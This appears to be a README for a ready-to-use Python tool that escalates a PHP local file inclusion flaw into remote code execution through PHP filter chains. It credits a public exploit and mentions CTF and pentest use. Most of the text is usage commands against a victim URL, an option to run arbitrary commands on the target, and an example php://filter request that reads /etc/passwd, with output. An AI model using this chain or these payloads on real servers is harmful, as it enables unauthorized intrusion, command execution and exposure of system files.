# LFI to RCE : filters
Found an LFI with PHP filters ? Use this script for RCE !

## Basic usage
```
python3 lfi-to-rce.py http://example.com/vuln_page.php file
```

## Detailled commands

```
usage: lfi-to-rce.py [-h] [-c CMD] [-f FILE] [-d] url parameter

Example : python3 lfi-to-rce.py https://example.com/vuln_page.php file

positional arguments:
  url                   full path to vulnerable page
  parameter             GET parameter vulnerable to LFI

optional arguments:
  -h, --help            show this help message and exit
  -c COOKIE, --cookie COOKIE
                        cookie for the GET request
  -x CMD, --cmd CMD     execute a single command then stop program
  -f FILE, --file FILE  remote file to use : this should point to a valid file on the victim's server. Default : /etc/passwd
  -d, --debug           troubleshooting

```

## Explanation
For this script to work, you have to find an exploitable website with an LFI working with PHP filters.

For example, let's say that http://example.com is vulnerable to LFI on the `vuln_page.php` page with the `file` parameter and PHP filters :

```
GET http://example.com/vuln_page.php?file=php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Then, you can use this script to gain an easy RCE (no need to check for logging files or other bullsh*t :p) :

`python3 lfi-to-rce.py http://example.com/vuln_page.php file`

For this you'll only need a known file on the system which is readable by the user the server is running as. By default, it uses /etc/passwd but if this file is not accessible, you have to change it with the `-f` or `--file` argument. This will be the case if the server is running on Windows for example !

A smart choice could be using the vulnerable PHP file on the server ! For example :

`python3 lfi-to-rce.py http://example.com/vuln_page.php file --file "./vuln_page.php"`

For more technical details, check the links in Credits !

## Credits
Disclaimer : I did NOT found this exploit, I only used it to build a ready-to-use script useful for CTF or pentests. Full credit for the exploit goes to loknop.

Exploit and most of the code : https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d \
Chain generator : https://github.com/synacktiv/php_filter_chain_generator
